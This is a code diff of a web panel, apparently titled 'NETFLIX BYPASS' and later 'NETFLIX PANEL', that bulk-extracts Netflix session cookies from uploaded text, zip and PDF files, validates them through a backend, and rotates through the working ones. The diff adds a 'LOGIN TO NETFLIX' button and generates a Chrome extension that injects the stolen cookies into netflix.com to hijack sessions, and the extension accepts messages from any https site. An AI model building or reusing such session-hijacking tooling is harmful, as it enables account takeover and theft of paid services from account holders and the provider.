@@ -3,202 +3,55 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>NETFLIX BYPASS — AFTAB</title>
+<title>NETFLIX PANEL — AFTAB</title>
 <style>
 :root{
+  --nf:#e50914;
   --cy:#00f0ff;
   --mg:#ff2bd6;
-  --bg:#05060a;
-  --panel:#0a0c14;
-  --line:rgba(0,240,255,.25);
-  --mgl:rgba(255,43,214,.25);
-  --dim:#7a8399;
-  --nf:#e50914;
+  --line:rgba(0,240,255,.3);
 }
 *{box-sizing:border-box}
-html,body{margin:0;padding:0;background:var(--bg);color:#e8f6ff;font-family:"SF Mono",ui-monospace,Menlo,Consolas,monospace;min-height:100vh}
-body::before{
-  content:"";position:fixed;inset:0;pointer-events:none;z-index:1;
-  background:repeating-linear-gradient(0deg,rgba(0,240,255,.035) 0 1px,transparent 1px 3px);
-  mix-blend-mode:screen;
-}
-body::after{
-  content:"";position:fixed;inset:-50%;pointer-events:none;z-index:0;
-  background:
-    radial-gradient(circle at 20% 10%,rgba(0,240,255,.10),transparent 45%),
-    radial-gradient(circle at 85% 90%,rgba(255,43,214,.10),transparent 45%);
-}
+html,body{margin:0;padding:0;background:#05060a;color:#e8f6ff;font-family:"SF Mono",ui-monospace,Menlo,Consolas,monospace;min-height:100vh}
 
-/* ================= NETFLIX INTRO ================= */
-#intro{
-  position:fixed;inset:0;z-index:9999;background:#000;
-  display:flex;align-items:center;justify-content:center;flex-direction:column;
-  transition:opacity .7s ease,visibility .7s ease;
-  overflow:hidden;
+#matrix{
+  position:fixed;inset:0;z-index:0;
+  display:block;width:100vw;height:100vh;
+  opacity:.32;
 }
-#intro.gone{opacity:0;visibility:hidden;pointer-events:none}
+.wrap{position:relative;z-index:1;max-width:520px;margin:0 auto;padding:22px 16px 60px}
 
-.nf-stage{
-  position:relative;display:flex;flex-direction:column;align-items:center;
-  perspective:900px;
-}
-.nf-N{
-  font-family:"Arial Black","Helvetica Neue",Arial,sans-serif;
-  font-weight:900;
-  font-size:clamp(110px,32vw,240px);
-  line-height:.8;
-  letter-spacing:-.05em;
-  color:var(--nf);
-  position:relative;
-  transform:scale(.2) rotateY(90deg);
-  opacity:0;
-  filter:blur(20px) brightness(.4);
-  text-shadow:
-    0 0 20px rgba(229,9,20,.9),
-    0 0 60px rgba(229,9,20,.7),
-    0 0 120px rgba(229,9,20,.45);
-  animation:nfReveal 1.15s cubic-bezier(.16,1,.3,1) .25s forwards;
-}
-.nf-N::before,
-.nf-N::after{
-  content:"N";
-  position:absolute;inset:0;
-  font-family:inherit;font-weight:inherit;font-size:inherit;letter-spacing:inherit;line-height:inherit;
-  pointer-events:none;
-}
-.nf-N::before{
-  color:rgba(255,60,80,.55);
-  filter:blur(18px);
-  animation:ghostA 1.2s ease .3s forwards;
-  opacity:0;
-}
-.nf-N::after{
-  color:rgba(255,255,255,.35);
-  filter:blur(40px);
-  animation:ghostB 1.4s ease .4s forwards;
-  opacity:0;
-}
+.head{display:flex;align-items:center;justify-content:space-between;margin-bottom:16px}
+.head h1{margin:0;font-size:18px;letter-spacing:.15em;color:#fff;text-shadow:0 0 14px var(--nf),0 0 30px rgba(229,9,20,.55);font-weight:900}
+.head .sub{font-size:10px;color:var(--cy);letter-spacing:.3em;margin-top:4px}
+.pill{border:1px solid var(--cy);color:var(--cy);font-size:10px;letter-spacing:.25em;padding:5px 12px;border-radius:999px;background:rgba(0,240,255,.06);box-shadow:0 0 14px rgba(0,240,255,.25)}
 
-.nf-word{
-  margin-top:6px;
-  font-family:"Arial Black","Helvetica Neue",Arial,sans-serif;
-  font-weight:900;
-  font-size:clamp(20px,6vw,42px);
-  letter-spacing:.55em;
-  color:var(--nf);
-  text-shadow:0 0 18px rgba(229,9,20,.85),0 0 44px rgba(229,9,20,.5);
-  opacity:0;
-  transform:translateY(14px) scale(.9);
-  animation:nfWord 1s cubic-bezier(.2,.9,.2,1) 1.25s forwards;
-  padding-left:.55em;
-}
+.clock{font-size:10px;color:#7a8399;letter-spacing:.25em;text-align:center;margin-bottom:14px}
 
-.nf-sweep{
-  position:absolute;inset:-40% -10%;
-  background:linear-gradient(105deg,transparent 42%,rgba(255,255,255,.55) 50%,transparent 58%);
-  mix-blend-mode:overlay;pointer-events:none;
-  opacity:0;
-  animation:nfSweep 1.1s ease 1.35s forwards;
-}
-
-.nf-fade{
-  position:absolute;inset:0;background:radial-gradient(circle at center,transparent 30%,#000 90%);
-  pointer-events:none;z-index:-1;
-}
-
-@keyframes nfReveal{
-  0%{opacity:0;transform:scale(.2) rotateY(90deg);filter:blur(20px) brightness(.4)}
-  55%{opacity:1;filter:blur(3px) brightness(1.35)}
-  100%{opacity:1;transform:scale(1) rotateY(0deg);filter:blur(0) brightness(1)}
-}
-@keyframes ghostA{
-  0%{opacity:0;transform:scale(.9)}
-  60%{opacity:1;transform:scale(1.08)}
-  100%{opacity:0;transform:scale(1.25)}
-}
-@keyframes ghostB{
-  0%{opacity:0;transform:scale(.7)}
-  50%{opacity:.9;transform:scale(1.15)}
-  100%{opacity:0;transform:scale(1.5)}
-}
-@keyframes nfWord{
-  to{opacity:1;transform:translateY(0) scale(1)}
-}
-@keyframes nfSweep{
-  0%{opacity:0;transform:translateX(-30%)}
-  30%{opacity:.9}
-  100%{opacity:0;transform:translateX(30%)}
-}
-
-/* ================= SHELL ================= */
-.wrap{
-  position:relative;z-index:2;max-width:520px;margin:0 auto;
-  padding:22px 16px 60px;opacity:0;transform:translateY(10px);
-  transition:opacity .5s ease,transform .5s ease;
-}
-.wrap.live{opacity:1;transform:none}
-
-.head{display:flex;align-items:center;justify-content:space-between;gap:12px;margin-bottom:18px}
-.head h1{
-  margin:0;font-size:17px;letter-spacing:.18em;font-weight:800;
-  color:#fff;text-shadow:0 0 14px var(--cy),0 0 30px rgba(0,240,255,.5)
-}
-.head .sub{font-size:10px;color:var(--mg);letter-spacing:.3em;margin-top:4px}
-.pill{
-  border:1px solid var(--cy);color:var(--cy);font-size:10px;letter-spacing:.25em;
-  padding:5px 12px;border-radius:999px;background:rgba(0,240,255,.06);
-  box-shadow:0 0 14px rgba(0,240,255,.25)
-}
-
-.panel{
-  position:relative;background:linear-gradient(180deg,rgba(10,12,20,.92),rgba(10,12,20,.75));
-  border:1px solid var(--line);border-radius:14px;padding:16px;margin-bottom:14px;
-  backdrop-filter:blur(6px);
-  box-shadow:0 0 0 1px rgba(255,43,214,.05) inset,0 12px 40px rgba(0,0,0,.6);
-}
-.panel::before{
-  content:"";position:absolute;inset:0;border-radius:14px;pointer-events:none;
-  background:linear-gradient(135deg,rgba(0,240,255,.06),transparent 40%,rgba(255,43,214,.06))
-}
-.panel h2{
-  margin:0 0 12px;font-size:11px;letter-spacing:.3em;color:var(--mg);font-weight:700;
-  display:flex;align-items:center;gap:8px
-}
+.panel{position:relative;background:linear-gradient(180deg,rgba(10,12,20,.92),rgba(10,12,20,.75));border:1px solid var(--line);border-radius:14px;padding:16px;margin-bottom:14px;backdrop-filter:blur(6px);box-shadow:0 0 0 1px rgba(255,43,214,.05) inset,0 12px 40px rgba(0,0,0,.6)}
+.panel h2{margin:0 0 12px;font-size:11px;letter-spacing:.3em;color:var(--mg);font-weight:700;display:flex;align-items:center;gap:8px}
 .panel h2::before{content:"";width:6px;height:6px;background:var(--mg);box-shadow:0 0 10px var(--mg);border-radius:50%}
 
-textarea{
-  width:100%;height:86px;background:#04050a;color:#d6faff;
-  border:1px solid var(--line);border-radius:10px;padding:11px;
-  font-family:inherit;font-size:12px;resize:vertical;outline:none;
-  transition:border-color .2s,box-shadow .2s
-}
+textarea{width:100%;height:86px;background:#04050a;color:#d6faff;border:1px solid var(--line);border-radius:10px;padding:11px;font-family:inherit;font-size:12px;resize:vertical;outline:none;transition:border-color .2s,box-shadow .2s}
 textarea:focus{border-color:var(--cy);box-shadow:0 0 0 3px rgba(0,240,255,.10),0 0 20px rgba(0,240,255,.2)}
 textarea::placeholder{color:#42506a}
 
-button{
-  width:100%;border:none;border-radius:10px;padding:12px 14px;margin-top:9px;
-  font-family:inherit;font-size:12px;font-weight:800;letter-spacing:.18em;
-  cursor:pointer;color:#04050a;background:var(--cy);
-  box-shadow:0 0 18px rgba(0,240,255,.35);transition:transform .12s,box-shadow .2s,filter .2s
-}
+button{width:100%;border:none;border-radius:10px;padding:12px 14px;margin-top:9px;font-family:inherit;font-size:12px;font-weight:800;letter-spacing:.18em;cursor:pointer;color:#04050a;background:var(--cy);box-shadow:0 0 18px rgba(0,240,255,.35);transition:transform .12s,box-shadow .2s}
 button:hover{transform:translateY(-1px);box-shadow:0 0 26px rgba(0,240,255,.55)}
-button:active{transform:translateY(0)}
 button.mg{background:var(--mg);color:#fff;box-shadow:0 0 18px rgba(255,43,214,.45)}
 button.mg:hover{box-shadow:0 0 28px rgba(255,43,214,.7)}
+button.red{background:var(--nf);color:#fff;box-shadow:0 0 22px rgba(229,9,20,.65);font-size:13px;padding:15px;letter-spacing:.22em}
+button.red:hover{box-shadow:0 0 34px rgba(229,9,20,.95);transform:translateY(-1px)}
 button.ghost{background:transparent;color:var(--cy);border:1px solid var(--cy);box-shadow:none}
 button.ghost.mg{color:var(--mg);border-color:var(--mg)}
-button.danger{background:#ff2d55;color:#fff;box-shadow:0 0 18px rgba(255,45,85,.4)}
-button:disabled{opacity:.35;cursor:not-allowed;transform:none;box-shadow:none}
+button:disabled{opacity:.35;cursor:not-allowed}
 
 .grid2{display:grid;grid-template-columns:1fr 1fr;gap:10px}
 .grid2 button{margin-top:0}
 
 .stats{display:grid;grid-template-columns:1fr 1fr;gap:10px;margin-bottom:14px}
-.stat{
-  border:1px solid var(--line);border-radius:12px;padding:12px;text-align:center;
-  background:linear-gradient(180deg,rgba(0,240,255,.05),transparent)
-}
-.stat .k{font-size:9px;letter-spacing:.3em;color:var(--dim)}
+.stat{border:1px solid var(--line);border-radius:12px;padding:12px;text-align:center;background:linear-gradient(180deg,rgba(0,240,255,.05),transparent)}
+.stat .k{font-size:9px;letter-spacing:.3em;color:#7a8399}
 .stat .v{font-size:22px;font-weight:900;margin-top:4px;color:var(--cy);text-shadow:0 0 14px rgba(0,240,255,.6)}
 .stat.bad .v{color:var(--mg);text-shadow:0 0 14px rgba(255,43,214,.6)}
 
@@ -209,16 +62,15 @@ button:disabled{opacity:.35;cursor:not-allowed;transform:none;box-shadow:none}
 
 .upload{position:relative;overflow:hidden;display:block}
 .upload input{position:absolute;inset:0;opacity:0;cursor:pointer;width:100%;height:100%}
-
 .loader{display:none;text-align:center;font-size:11px;color:var(--cy);letter-spacing:.15em;padding:10px 0}
 .loader.on{display:block;animation:blink 1s steps(2) infinite}
 @keyframes blink{50%{opacity:.45}}
 .progress{display:none;height:8px;background:#04050a;border:1px solid var(--line);border-radius:999px;overflow:hidden;margin:6px 0}
 .progress.on{display:block}
 .bar{height:100%;width:0;background:linear-gradient(90deg,var(--cy),var(--mg));transition:width .2s;box-shadow:0 0 14px var(--cy)}
-.ptext{font-size:10px;color:var(--dim);text-align:center;letter-spacing:.15em}
+.ptext{font-size:10px;color:#7a8399;text-align:center;letter-spacing:.15em}
 
-.rotate{display:none;border:1px solid var(--mgl);border-radius:12px;padding:14px;margin-bottom:14px;background:linear-gradient(180deg,rgba(255,43,214,.05),transparent)}
+.rotate{display:none;border:1px solid rgba(255,43,214,.25);border-radius:12px;padding:14px;margin-bottom:14px;background:linear-gradient(180deg,rgba(255,43,214,.05),transparent)}
 .rotate.on{display:block}
 .rcount{text-align:center;font-size:14px;font-weight:900;color:#fff;letter-spacing:.2em}
 .rprof{text-align:center;font-size:10px;color:var(--cy);letter-spacing:.15em;margin:6px 0;word-break:break-all}
@@ -226,98 +78,37 @@ button:disabled{opacity:.35;cursor:not-allowed;transform:none;box-shadow:none}
 
 .modal{display:none;position:fixed;inset:0;background:rgba(2,3,7,.92);backdrop-filter:blur(4px);z-index:500;overflow-y:auto;padding:20px}
 .modal.on{display:block}
-.modal-in{max-width:480px;margin:40px auto;background:var(--panel);border:1px solid var(--line);border-radius:16px;padding:20px;box-shadow:0 0 40px rgba(0,240,255,.2)}
+.modal-in{max-width:480px;margin:40px auto;background:#0a0c14;border:1px solid var(--line);border-radius:16px;padding:20px;box-shadow:0 0 40px rgba(0,240,255,.2)}
 .modal-in h3{margin:0 0 14px;color:var(--mg);font-size:13px;letter-spacing:.3em;text-align:center}
-.hitem{border:1px solid var(--line);border-radius:10px;padding:9px;margin-bottom:8px;font-size:10px;color:#b7c6dd}
-.hitem .t{color:var(--cy);display:block;margin-bottom:3px;letter-spacing:.1em}
-
-.clock{font-size:10px;color:var(--dim);letter-spacing:.25em;text-align:center;margin-bottom:14px}
-
-/* ================= MADE BY AFTAB + TG ================= */
-.made{text-align:center;margin-top:30px;display:flex;flex-direction:column;align-items:center;gap:14px}
-.made-badge{
-  display:inline-block;
-  color:#04050a;
-  background:linear-gradient(90deg,var(--cy),var(--mg));
-  padding:11px 26px;
-  border-radius:999px;
-  font-size:12px;
-  font-weight:900;
-  letter-spacing:.35em;
-  box-shadow:
-    0 0 22px rgba(0,240,255,.6),
-    0 0 44px rgba(255,43,214,.4),
-    0 0 0 2px rgba(255,255,255,.08) inset;
-  text-shadow:0 0 6px rgba(255,255,255,.35);
-  animation:makerPulse 2.6s ease-in-out infinite;
-  position:relative;
-}
-.made-badge::before{
-  content:"";
-  position:absolute;inset:-6px;border-radius:999px;
-  background:linear-gradient(90deg,var(--cy),var(--mg));
-  filter:blur(14px);opacity:.55;z-index:-1;
-}
-@keyframes makerPulse{
-  0%,100%{transform:scale(1);box-shadow:0 0 22px rgba(0,240,255,.6),0 0 44px rgba(255,43,214,.4)}
-  50%{transform:scale(1.035);box-shadow:0 0 32px rgba(0,240,255,.85),0 0 60px rgba(255,43,214,.65)}
-}
-.tg-card{
-  display:inline-flex;align-items:center;gap:10px;
-  border:1px solid rgba(0,240,255,.35);
-  background:linear-gradient(180deg,rgba(0,240,255,.06),rgba(255,43,214,.04));
-  padding:9px 16px;border-radius:999px;
-  box-shadow:0 0 18px rgba(0,240,255,.25);
-  text-decoration:none;
-  transition:transform .15s,box-shadow .2s,border-color .2s;
-}
-.tg-card:hover{transform:translateY(-1px);border-color:var(--cy);box-shadow:0 0 26px rgba(0,240,255,.5)}
-.tg-card svg{width:20px;height:20px;display:block;filter:drop-shadow(0 0 6px rgba(0,240,255,.8))}
-.tg-handle{
-  font-size:12px;font-weight:800;letter-spacing:.15em;
-  background:linear-gradient(90deg,var(--cy),var(--mg));
-  -webkit-background-clip:text;background-clip:text;color:transparent;
-}
-
-.hist-item{
-  border:1px solid var(--line);border-radius:10px;padding:10px;margin-bottom:8px;
-  font-size:10px;color:#b7c6dd;cursor:pointer;transition:border-color .2s,background .2s;
-  position:relative;
-}
+.hist-item{border:1px solid var(--line);border-radius:10px;padding:10px;margin-bottom:8px;font-size:10px;color:#b7c6dd;cursor:pointer;transition:border-color .2s,background .2s;position:relative}
 .hist-item:hover{border-color:var(--cy);background:rgba(0,240,255,.05)}
 .hist-item .t{color:var(--cy);display:block;margin-bottom:4px;letter-spacing:.1em}
-.hist-item .meta{color:var(--dim);font-size:9px}
-.hist-item .ck{
-  margin-top:6px;background:#04050a;border:1px solid var(--line);border-radius:6px;
-  padding:6px;font-size:9px;word-break:break-all;color:#9fe9ff;max-height:44px;overflow:hidden;
-}
-.hist-item .tag{
-  position:absolute;top:8px;right:8px;font-size:8px;letter-spacing:.2em;
-  padding:3px 8px;border-radius:999px;font-weight:800;
-}
+.hist-item .meta{color:#7a8399;font-size:9px}
+.hist-item .ck{margin-top:6px;background:#04050a;border:1px solid var(--line);border-radius:6px;padding:6px;font-size:9px;word-break:break-all;color:#9fe9ff;max-height:44px;overflow:hidden}
+.hist-item .tag{position:absolute;top:8px;right:8px;font-size:8px;letter-spacing:.2em;padding:3px 8px;border-radius:999px;font-weight:800}
 .tag.ok{background:rgba(0,240,255,.12);color:var(--cy);border:1px solid var(--cy)}
 .tag.bad{background:rgba(255,43,214,.12);color:var(--mg);border:1px solid var(--mg)}
 .hist-empty{color:#42506a;text-align:center;padding:24px;font-size:11px;letter-spacing:.2em}
+
+.made{text-align:center;margin-top:26px;display:flex;flex-direction:column;align-items:center;gap:14px}
+.made-badge{display:inline-block;color:#04050a;background:linear-gradient(90deg,var(--cy),var(--mg));padding:11px 26px;border-radius:999px;font-size:12px;font-weight:900;letter-spacing:.35em;box-shadow:0 0 22px rgba(0,240,255,.6),0 0 44px rgba(255,43,214,.4),0 0 0 2px rgba(255,255,255,.08) inset;text-shadow:0 0 6px rgba(255,255,255,.35);animation:makerPulse 2.6s ease-in-out infinite;position:relative}
+.made-badge::before{content:"";position:absolute;inset:-6px;border-radius:999px;background:linear-gradient(90deg,var(--cy),var(--mg));filter:blur(14px);opacity:.55;z-index:-1}
+@keyframes makerPulse{0%,100%{transform:scale(1);box-shadow:0 0 22px rgba(0,240,255,.6),0 0 44px rgba(255,43,214,.4)}50%{transform:scale(1.035);box-shadow:0 0 32px rgba(0,240,255,.85),0 0 60px rgba(255,43,214,.65)}}
+.tg-card{display:inline-flex;align-items:center;gap:10px;border:1px solid rgba(0,240,255,.35);background:linear-gradient(180deg,rgba(0,240,255,.08),rgba(255,43,214,.05));padding:9px 16px;border-radius:999px;box-shadow:0 0 18px rgba(0,240,255,.25);text-decoration:none;backdrop-filter:blur(4px);transition:transform .15s,box-shadow .2s,border-color .2s}
+.tg-card:hover{transform:translateY(-1px);border-color:var(--cy);box-shadow:0 0 26px rgba(0,240,255,.5)}
+.tg-card svg{width:20px;height:20px;display:block;filter:drop-shadow(0 0 6px rgba(0,240,255,.8))}
+.tg-handle{font-size:12px;font-weight:800;letter-spacing:.15em;background:linear-gradient(90deg,var(--cy),var(--mg));-webkit-background-clip:text;background-clip:text;color:transparent}
 </style>
 </head>
 <body>
 
-<!-- ============ NETFLIX INTRO ============ -->
-<div id="intro">
-  <div class="nf-fade"></div>
-  <div class="nf-stage">
-    <div class="nf-N">N</div>
-    <div class="nf-word">NETFLIX</div>
-    <div class="nf-sweep"></div>
-  </div>
-</div>
+<canvas id="matrix"></canvas>
 
-<!-- ============ APP ============ -->
-<div class="wrap" id="app">
+<div class="wrap">
   <div class="head">
     <div>
-      <h1>NETFLIX BYPASS</h1>
-      <div class="sub">PANEL // v2</div>
+      <h1>NETFLIX PANEL</h1>
+      <div class="sub">COOKIE SYSTEM // AFTAB</div>
     </div>
     <div class="pill">LIVE</div>
   </div>
@@ -352,6 +143,7 @@ button:disabled{opacity:.35;cursor:not-allowed;transform:none;box-shadow:none}
     <div class="rprof" id="rotProfile"></div>
     <div class="rcookie" id="rotCookie"></div>
     <button class="mg" onclick="copyCurrent()">COPY THIS COOKIE</button>
+    <button class="red" onclick="loginNetflix()">LOGIN TO NETFLIX</button>
     <div class="grid2" style="margin-top:9px">
       <button class="ghost" onclick="prevCookie()">← PREV</button>
       <button class="ghost mg" onclick="nextCookie()">NEXT →</button>
@@ -361,22 +153,16 @@ button:disabled{opacity:.35;cursor:not-allowed;transform:none;box-shadow:none}
   <div class="panel">
     <h2>ACTIONS</h2>
     <button onclick="downloadExt()">DOWNLOAD EXTENSION</button>
-    <button class="danger" onclick="bypassNow()">BYPASS &amp; OPEN NETFLIX</button>
-    <button class="ghost mg" onclick="showHistory()">VIEW HISTORY</button>
+    <button class="mg" onclick="showHistory()">VIEW HISTORY</button>
   </div>
 
   <div class="made">
     <div class="made-badge">MADE BY AFTAB</div>
     <a class="tg-card" href="https://t.me/shadow0476" target="_blank" rel="noopener">
-      <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
+      <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
         <circle cx="12" cy="12" r="11" fill="url(#tgGrad)"/>
         <path d="M5.5 12.2l11.2-4.3c.5-.2.95.2.78.72l-1.9 8.9c-.15.65-.55.8-1.1.5l-3.05-2.25-1.48 1.42c-.16.16-.3.3-.62.3l.22-3.12 5.7-5.15c.25-.22-.05-.34-.38-.13l-7.05 4.44-3.03-.95c-.65-.2-.66-.65.13-.92z" fill="#04050a"/>
-        <defs>
-          <linearGradient id="tgGrad" x1="0" y1="0" x2="24" y2="24" gradientUnits="userSpaceOnUse">
-            <stop offset="0" stop-color="#00f0ff"/>
-            <stop offset="1" stop-color="#ff2bd6"/>
-          </linearGradient>
-        </defs>
+        <defs><linearGradient id="tgGrad" x1="0" y1="0" x2="24" y2="24" gradientUnits="userSpaceOnUse"><stop offset="0" stop-color="#00f0ff"/><stop offset="1" stop-color="#ff2bd6"/></linearGradient></defs>
       </svg>
       <span class="tg-handle">@shadow0476</span>
     </a>
@@ -388,7 +174,7 @@ button:disabled{opacity:.35;cursor:not-allowed;transform:none;box-shadow:none}
     <h3>SCAN HISTORY</h3>
     <div class="grid2" style="margin-bottom:12px">
       <button class="ghost" onclick="hideHistory()">CLOSE</button>
-      <button class="danger" onclick="clearHistory()">CLEAR ALL</button>
+      <button class="red" onclick="clearHistory()">CLEAR ALL</button>
     </div>
     <div id="historyList" style="margin-top:6px"></div>
   </div>
@@ -397,28 +183,53 @@ button:disabled{opacity:.35;cursor:not-allowed;transform:none;box-shadow:none}
 <script src="https://cdnjs.cloudflare.com/ajax/libs/jszip/3.10.1/jszip.min.js"></script>
 <script src="https://cdnjs.cloudflare.com/ajax/libs/pdf.js/3.11.174/pdf.min.js"></script>
 <script>
-/* ================= INTRO GATE — no skip, auto fade after full animation ================= */
+/* ===== MATRIX RAIN ===== */
 (function(){
-  var intro=document.getElementById('intro');
-  var app=document.getElementById('app');
-  setTimeout(function(){
-    intro.classList.add('gone');
-    setTimeout(function(){app.classList.add('live')},120);
-  }, 2600);
+  var cv=document.getElementById('matrix');
+  var ctx=cv.getContext('2d');
+  var cols, drops, fontSize=16;
+  var chars='アカサタナハマヤラワ0123456789ABCDEFabcdef#$%&*+=<>?';
+  function resize(){
+    cv.width=window.innerWidth;
+    cv.height=window.innerHeight;
+    cols=Math.floor(cv.width/fontSize);
+    drops=[];
+    for(var i=0;i<cols;i++) drops[i]=Math.random()*cv.height/fontSize;
+  }
+  resize();
+  window.addEventListener('resize',resize);
+  function draw(){
+    ctx.fillStyle='rgba(5,6,10,0.08)';
+    ctx.fillRect(0,0,cv.width,cv.height);
+    ctx.font=fontSize+'px monospace';
+    for(var i=0;i<drops.length;i++){
+      var ch=chars.charAt(Math.floor(Math.random()*chars.length));
+      var x=i*fontSize;
+      var y=drops[i]*fontSize;
+      var r=Math.random();
+      if(r>0.96){ctx.fillStyle='rgba(229,9,20,0.95)';}
+      else if(r>0.85){ctx.fillStyle='rgba(180,255,240,0.95)';}
+      else{ctx.fillStyle='rgba(0,240,255,0.75)';}
+      ctx.fillText(ch,x,y);
+      if(y>cv.height && Math.random()>0.975) drops[i]=0;
+      drops[i]++;
+    }
+  }
+  setInterval(draw,50);
 })();
 
-/* ================= STATE ================= */
+/* ===== STATE ===== */
 var validCookies=[];
 var invalidCookies=[];
 var lastValidCookie='';
 var allChunks=[];
 var rotIndex=0;
 
-/* ================= CLOCK ================= */
+/* ===== CLOCK ===== */
 function setClock(){document.getElementById('clock').textContent='CORE: BYPASS // '+new Date().toLocaleTimeString('en-US',{hour12:false})}
 setInterval(setClock,1000);setClock();
 
-/* ================= COOKIE EXTRACTOR ================= */
+/* ===== COOKIE EXTRACTOR ===== */
 function extract(raw){
   if(!raw) return '';
   var keep=['netflixid','securenetflixid','nfvdid'];
@@ -502,7 +313,7 @@ function splitGroups(text){
   return groups;
 }
 
-/* ================= VALIDATE ================= */
+/* ===== VALIDATE ===== */
 async function validate(cookie){
   try{
     var res=await fetch('/api/validate',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({cookie:cookie,device:'mobile'})});
@@ -511,7 +322,7 @@ async function validate(cookie){
   }catch(e){ return {ok:false,error:e.message} }
 }
 
-/* ================= SINGLE CHECK ================= */
+/* ===== SINGLE CHECK ===== */
 async function checkSingle(){
   var input=document.getElementById('singleInput').value.trim();
   var status=document.getElementById('status');
@@ -536,7 +347,7 @@ async function checkSingle(){
   }
 }
 
-/* ================= FILE READ ================= */
+/* ===== FILE READ ===== */
 async function readFileContent(file){
   if(file.name.toLowerCase().endsWith('.pdf')){
     var buf=await file.arrayBuffer();
@@ -552,7 +363,7 @@ async function readFileContent(file){
   return await file.text();
 }
 
-/* ================= BULK UPLOAD ================= */
+/* ===== BULK UPLOAD ===== */
 async function uploadFile(event){
   var files=event.target.files;
   if(!files.length) return;
@@ -562,13 +373,10 @@ async function uploadFile(event){
   var progressText=document.getElementById('progressText');
   loader.classList.add('on');
   progress.classList.add('on');
-
   allChunks=[];
-
   for(var f=0;f<files.length;f++){
     var file=files[f];
     loader.textContent='reading: '+file.name+' ('+(f+1)+'/'+files.length+')';
-
     try{
       if(file.name.toLowerCase().endsWith('.zip')){
         var buf=await file.arrayBuffer();
@@ -589,11 +397,8 @@ async function uploadFile(event){
         var gs=splitGroups(text);
         for(var gg=0;gg<gs.length;gg++) allChunks.push(gs[gg]);
       }
-    }catch(e){
-      console.log('file error: '+file.name+' — '+e.message);
-    }
+    }catch(e){console.log('file error: '+file.name+' — '+e.message);}
   }
-
   var unique={};
   var finalChunks=[];
   for(var i=0;i<allChunks.length;i++){
@@ -603,10 +408,8 @@ async function uploadFile(event){
     unique[norm]=true;
     finalChunks.push(norm);
   }
-
   loader.textContent='validating '+finalChunks.length+' cookies...';
   validCookies=[];invalidCookies=[];
-
   var batchSize=5;
   for(var b=0;b<finalChunks.length;b+=batchSize){
     var batch=finalChunks.slice(b,b+batchSize);
@@ -625,7 +428,6 @@ async function uploadFile(event){
     progressBar.style.width=pct+'%';
     progressText.textContent='scanned '+done+'/'+finalChunks.length+' — '+validCookies.length+' valid';
   }
-
   loader.classList.remove('on');
   progress.classList.remove('on');
   document.getElementById('validCount').textContent=validCookies.length;
@@ -637,7 +439,7 @@ async function uploadFile(event){
   }
 }
 
-/* ================= ROTATION ================= */
+/* ===== ROTATION ===== */
 function showRotate(){
   var box=document.getElementById('rotateBox');
   if(!validCookies.length){box.classList.remove('on');return}
@@ -677,25 +479,81 @@ function copyCurrent(){
   }
 }
 
-/* ================= EXTENSION ================= */
+/* ===== LOGIN TO NETFLIX (extension inject) ===== */
+function loginNetflix(){
+  var cookie='';
+  if(validCookies && validCookies.length>0){
+    cookie=validCookies[rotIndex].cookie;
+  }else if(lastValidCookie){
+    cookie=lastValidCookie;
+  }else{
+    alert('pehle cookie check karo');
+    return;
+  }
+  if(typeof chrome!=='undefined' && chrome.runtime && chrome.runtime.sendMessage){
+    try{
+      chrome.runtime.sendMessage({action:'inject', cookie:cookie}, function(resp){
+        if(chrome.runtime.lastError){
+          if(navigator.clipboard) navigator.clipboard.writeText(cookie);
+          alert('cookie copied. pehle DOWNLOAD EXTENSION karke browser mein load karo, phir dobara LOGIN dabao.');
+        }
+      });
+    }catch(e){
+      if(navigator.clipboard) navigator.clipboard.writeText(cookie);
+      alert('cookie copied. extension install karo phir dobara try karo.');
+    }
+  }else{
+    if(navigator.clipboard) navigator.clipboard.writeText(cookie);
+    alert('cookie copied. DOWNLOAD EXTENSION karke browser mein load karo, phir LOGIN dabao — ek click mein Netflix khulega.');
+  }
+}
+
+/* ===== EXTENSION DOWNLOAD ===== */
 function downloadExt(){
-  var manifest={manifest_version:3,name:'NF Cookie Injector',version:'1.0',permissions:['cookies','tabs'],host_permissions:['https://*.netflix.com/*'],action:{default_popup:'popup.html'}};
+  var manifest={
+    manifest_version:3,
+    name:'NF Cookie Injector',
+    version:'1.1',
+    permissions:['cookies','tabs','scripting','storage'],
+    host_permissions:['https://*.netflix.com/*'],
+    background:{service_worker:'background.js'},
+    action:{default_popup:'popup.html'},
+    externally_connectable:{matches:['https://*.vercel.app/*','http://localhost/*','https://*/*']}
+  };
+
+  var backgroundJs = "chrome.runtime.onMessageExternal.addListener(function(req,sender,sendResponse){\n" +
+    "if(!req||req.action!=='inject'){sendResponse({ok:false});return true;}\n" +
+    "var parts=(req.cookie||'').split(';').map(function(p){return p.trim()}).filter(Boolean);\n" +
+    "var done=0,total=parts.length;\n" +
+    "if(!total){sendResponse({ok:false});return true;}\n" +
+    "function finish(){if(++done>=total){chrome.tabs.create({url:'https://www.netflix.com/browse'});sendResponse({ok:true});}}\n" +
+    "parts.forEach(function(p){\n" +
+    "var eq=p.indexOf('=');\n" +
+    "if(eq<0){finish();return;}\n" +
+    "var name=p.substring(0,eq).trim(),value=p.substring(eq+1).trim();\n" +
+    "chrome.cookies.set({url:'https://www.netflix.com/',name:name,value:value,domain:'.netflix.com',path:'/',secure:true,sameSite:'no_restriction',expirationDate:Math.floor(Date.now()/1000)+2592000},function(){finish();});\n" +
+    "});\n" +
+    "return true;\n" +
+    "});";
+
   var popupHtml='<!doctype html><html><body style="width:280px;background:#000;color:#00f0ff;font-family:monospace;padding:12px"><h3>NF Injector</h3><textarea id="c" style="width:100%;height:100px;background:#000;color:#00f0ff;border:1px solid #00f0ff" placeholder="paste cookie"></textarea><button id="go" style="background:#00f0ff;color:#000;padding:10px;border:none;width:100%;margin-top:8px;font-weight:bold">INJECT</button><div id="s" style="margin-top:8px;font-size:11px;color:#ff2bd6"></div><script src="popup.js"><\/script></body></html>';
